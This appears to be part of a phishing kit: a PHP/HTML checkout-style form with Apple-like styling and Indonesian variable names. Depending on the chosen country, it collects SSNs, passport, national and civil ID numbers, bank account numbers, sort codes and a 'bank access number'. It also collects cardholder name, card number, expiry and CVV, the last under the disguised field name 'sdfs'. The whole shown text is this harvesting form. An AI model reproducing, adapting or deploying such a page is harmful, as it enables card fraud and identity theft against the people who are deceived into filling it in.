<option value="Senegal">Senegal</option> 
<option value="Serbia and Montenegro">Serbia and Montenegro</option> 
<option value="Seychelles">Seychelles</option> 
<option value="Sierra Leone">Sierra Leone</option> 
<option value="Singapore">Singapore</option> 
<option value="Slovakia">Slovakia</option> 
<option value="Slovenia">Slovenia</option> 
<option value="Solomon Islands">Solomon Islands</option> 
<option value="Somalia">Somalia</option> 
<option value="South Africa">South Africa</option> 
<option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option> 
<option value="Spain">Spain</option> 
<option value="Sri Lanka">Sri Lanka</option> 
<option value="Sudan">Sudan</option> 
<option value="Suriname">Suriname</option> 
<option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option> 
<option value="Swaziland">Swaziland</option> 
<option value="Sweden">Sweden</option> 
<option value="Switzerland">Switzerland</option> 
<option value="Syrian Arab Republic">Syrian Arab Republic</option> 
<option value="Taiwan, Province of China">Taiwan, Province of China</option> 
<option value="Tajikistan">Tajikistan</option> 
<option value="Tanzania, United Republic of">Tanzania, United Republic of</option> 
<option value="Thailand">Thailand</option> 
<option value="Timor-leste">Timor-leste</option> 
<option value="Togo">Togo</option> 
<option value="Tokelau">Tokelau</option> 
<option value="Tonga">Tonga</option> 
<option value="Trinidad and Tobago">Trinidad and Tobago</option> 
<option value="Tunisia">Tunisia</option> 
<option value="Turkey">Turkey</option> 
<option value="Turkmenistan">Turkmenistan</option> 
<option value="Turks and Caicos Islands">Turks and Caicos Islands</option> 
<option value="Tuvalu">Tuvalu</option> 
<option value="Uganda">Uganda</option> 
<option value="Ukraine">Ukraine</option> 
<option value="United Arab Emirates">United Arab Emirates</option> 
<option value="United States">United States</option>
<option value="United Kingdom">United Kingdom</option>
<option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option> 
<option value="Uruguay">Uruguay</option> 
<option value="Uzbekistan">Uzbekistan</option> 
<option value="Vanuatu">Vanuatu</option> 
<option value="Venezuela">Venezuela</option> 
<option value="Viet Nam">Viet Nam</option> 
<option value="Virgin Islands, British">Virgin Islands, British</option> 
<option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option> 
<option value="Wallis and Futuna">Wallis and Futuna</option> 
<option value="Western Sahara">Western Sahara</option> 
<option value="Yemen">Yemen</option> 
<option value="Zambia">Zambia</option> 
<option value="Zimbabwe">Zimbabwe</option></select>
<br><br><br>
<?php
if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="Canada" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom" or $negara=="New Zealand" or $negara=="United States" or $negara=="Ireland"){
?>
<input class="required" onkeyup="$('#zip').css('border-color', 'rgb(214, 214, 214)');" required="required" placeholder="<?php echo $zip;?>" maxlength="15" value="" name="zip" id="zip" type="txt" style="
    width: 320px;
    ">
<?php }else{?>
<input class="required" oninput="$('#zip').css('border-color', 'rgb(214, 214, 214)');$('#zip').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');" required="required" placeholder="<?php echo $zip;?>" maxlength="15" value="" name="zip" id="zip" type="txt" style="
    width: 320px;
    ">
<?php } ?>
    <br><br><br>
<?php
if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="United States" or $negara=="Canada" or $negara=="Ireland" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom" or $negara=="New Zealand"){
}else{
    echo '<div id="socountry1" style=""></div>';
}
?>
<?php
if ($negara=="Hong Kong"){ 
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($idnumber).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" id="checkvalid" name="idnumber" required="required" class="required" placeholder="'.$idnumber.'" value="" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
}
?>
<?php
if ($negara=="Cyprus" or $negara=="Greece"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($passpor).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" id="checkvalid" name="passportnumber" required="required" class="required" placeholder="'.$passpor.'" value="" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="Saudi Arabia"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($natio).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" name="nationalid" id="checkvalid" required="required" class="required" placeholder="'.$natio.'" value="" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="Qatar"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($qatariden).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" name="qatarid" id="checkvalid" required="required" class="required" placeholder="'.$qatariden.'" value="" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="Kuwait"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($civid).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" name="civilid" id="checkvalid" required="required" class="required" placeholder="'.$civid.'" value="" maxlength="20" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="United States"  or $negara=="Ireland"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($ssn).'</b></span><br><br><input oninput="'."$('#ssn2').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" id="ssn2" name="ssn" required="required" class="required" placeholder="'.$ssn.'" value="" maxlength="11" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="India"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($accnumber).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" id="checkvalid" name="acc_number" required="required" class="required" placeholder="'.$accnumber.'" value="" maxlength="15" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="United Kingdom"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($accnumber).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" id="checkvalid" name="acc_number" required="required" class="required" placeholder="'.$accnumber.'" value="" maxlength="15" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="Australia"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($osidnumber).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" id="checkvalid" name="osidnum" required="required" class="required" placeholder="'.$osidnumber.'" value="" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="Canada"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($sin).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" name="cassn" id="checkvalid" required="required" class="required" placeholder="'.$sin.'" value="" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="Thailand"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>'.strtoupper($citizen).'</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" name="citizenid" id="checkvalid" required="required" class="required" placeholder="'.$citizen.'" value="" type="tel" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<?php
if ($negara=="New Zealand"){
echo '<div id="socountry1" style=""><hr style="width: 320px;"><br><br><span class="xFont2" style="width:320px;">&nbsp;<b>BANK ACCESS NUMBER</b></span><br><br><input oninput="'."$('#checkvalid').css('border-color', 'rgb(214, 214, 214)');$('#button_alamat').removeClass('disabled');".'" name="bankaccnumber" id="checkvalid" required="required" class="required" placeholder="bank access number" value="" type="text" style="
    position: absolute;
    width: 320px;
    
"><br><br></div>';
};
?>
<br>
<div style="float:right">
<a onclick="document.getElementById('tanggallahir').style.display = 'block';document.getElementById('namanya').style.display = 'block';
    document.getElementById('alamat').style.display = 'none';" class="button-save" style="background-color:#e3e3e3;background:linear-gradient(#fff, #e3e3e3);border-color:#C7C6C6;color:#0070c9;text-decoration:none;"><?php echo $goback;?></a>
&nbsp;<span id="button_alamat" onclick="if(document.getElementById('adre1').value.length == 0)
{
    $('#adre1').css('border-color', '#D24122');
}else if(document.getElementById('city').value.length == 0){
    $('#city').css('border-color', '#D24122');
}else if(document.getElementById('zip').value.length == 0){
    $('#zip').css('border-color', '#D24122');
<?php
if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="Canada" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom" or $negara=="New Zealand"){
  echo "
  }else if(document.getElementById('checkvalid').value.length == 0){
  $('#checkvalid').css('border-color', '#D24122');";
  }
?>
<?php
if ($negara=="United States" or $negara=="Ireland"){
  echo "
  }else if(document.getElementById('ssn2').value.length != 11){
  $('#ssn2').css('border-color', '#D24122');";
  }
?>
}else{

            document.getElementById('kartu').style.display = 'block';
            document.getElementById('alamat').style.display = 'none';
    }" class="button-save disabled" style="
    margin-right:20px;width: 120px;">
<span><?php echo $save;?></span></span></div>

</div>
<div style="display:none;" id="kartu">
<?php
if ($negara=="Hong Kong" or $negara=="Cyprus" or $negara=="Greece" or $negara=="Saudi Arabia" or $negara=="Qatar" or $negara=="Kuwait" or $negara=="United States" or $negara=="Canada" or $negara=="Ireland" or $negara=="Australia" or $negara=="India" or $negara=="Thailand" or $negara=="United Kingdom" or $negara=="New Zealand"){
?>
<div id="carddet" style="left: 20px;">
    <span class="xFont2" style="width:320px;">&nbsp;<b><?php echo $besar_card;?></b></span>
<br><br>
<input class="required" type="text" required="required" name="cardname" placeholder="<?php echo $cchold;?>" style="width:320px;"><div class="field1">
<br><br><br>
<input name="number" id="cc_numbers" autocomplete="off" class="required" pattern="[2-7][0-9 ]{11,20}" minlength="13" required="required" maxlength="20" placeholder="<?php echo $creditnumber;?>" type="tel" style="width: 320px;">
</div>
<br><br><br>
<div class="field1">
<input type="tel" id="expireds" autocorrect="off" autocomplete="off" name="expred" required="required" maxlength="9" style="width: 320px; " placeholder="<?php echo $ddmm;?>" class="required">
</div>
<br><br><br>
<div class="field1">
<input class="required" id="cvv2_numbers" autocorrect="off" autocomplete="off" placeholder="<?php echo $secode;?>" maxlength="4" pattern="[0-9.]+" required="required" name="sdfs" type="tel" style="width: 320px;">
</div>
<div style="display:none;" id="3digitamex" class="field1">
    <br><br><br><input class="required" id="cid" autocorrect="off" autocomplete="off" placeholder="cid" maxlength="3" name="cid" type="tel" style="width: 320px;">
</div>
<div id="jaraknya"></div>
<?php
if ($negara=="Australia" or $negara=="Thailand" or $negara=="India" or $negara=="New Zealand" or $negara=="Saudi Arabia"){
echo '<div class="field" id="novbv">
<br><br><br><input class="required" onkeyup="'."$('#cclimit').css('border-color', 'rgb(214, 214, 214)');".'" id="cclimit" placeholder="'.strtolower($climit).'" required="required" name="cc_limit" style="width: 320px;">
</div>';
};
?>
<?php
if ($negara=="United Kingdom"){
echo '<div class="field" id="novbv">
<br><br><br><input class="required" id="sortcode" onkeyup="'."$('#sortcode').css('border-color', 'rgb(214, 214, 214)');".'" placeholder="sort code" required="required" name="sortcode" style="width: 320px;">
</div>';
};
?>
</div>

<?php }else{?>
<div id="carddet" style="left: 20px;">
    <span class="xFont2" style="width:320px;">&nbsp;<b><?php echo $besar_card;?></b></span>
<br><br>
<input class="required" type="text" required="required" name="cardname" placeholder="<?php echo $cchold;?>" style="width:320px;"><div class="field1">
<br><br><br>
<input name="number" id="cc_numbers" autocomplete="off" class="required" pattern="[2-7][0-9 ]{11,20}" minlength="13" required="required" maxlength="20" placeholder="<?php echo $creditnumber;?>" type="tel" style="width: 320px;">
</div>
<br><br><br>
<div class="field1">
<input type="tel" id="expireds" name="expred" autocorrect="off" autocomplete="off" required="required" maxlength="9" style="width: 320px; " placeholder="<?php echo $ddmm;?>" class="required">
</div>
<br><br><br>
<div class="field1">
<input class="required" id="cvv2_numbers" autocorrect="off" autocomplete="off" placeholder="<?php echo $secode;?>" maxlength="4" pattern="[0-9.]+" required="required" name="sdfs" type="tel" style="width: 320px;">
</div>
<div style="display:none;" id="3digitamex" class="field1">
<br><br><br><input class="required" id="cid" autocorrect="off" autocomplete="off" placeholder="cid" maxlength="3" name="cid" type="tel" style="width: 320px;">
</div>
<div id="jaraknya"></div>
<?php
echo '<div class="field" id="novbv">
</div>';
?>
</div>
<?php
}?>
<br><br><br><br>
<div style="float:right">
<a onclick="document.getElementById('tanggallahir').style.display = 'block';document.getElementById('kartu').style.display = 'none';
    document.getElementById('alamat').style.display = 'block';" class="button-save" style="background-color:#e3e3e3;background:linear-gradient(#fff, #e3e3e3);border-color:#C7C6C6;color:#0070c9;text-decoration:none;"><?php echo $goback;?></a>
&nbsp;
  <button id="savemob" class="button-save" type="submit" style="
    margin-right:20px;width: 120px;">
  <span><?php echo $save;?></span></button></div>

<br><br></div>
  <script src="../assets/js/main.js"></script>
  <script src="../assets/js/jquery.maskedinput.js"></script>
<script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>

</form>

  </div>
<div tabindex="-1" id="spinner2" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
<div tabindex="-1" id="spinner2_" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>